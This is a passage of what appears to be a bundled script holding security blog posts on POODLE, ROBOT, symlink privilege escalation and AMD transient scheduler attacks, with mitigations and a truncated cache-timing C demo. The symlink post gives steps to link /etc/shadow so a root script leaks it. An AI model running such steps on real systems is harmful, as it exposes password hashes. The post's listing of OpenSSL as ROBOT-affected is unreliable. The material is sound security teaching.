          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Cb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Rb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Pb=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
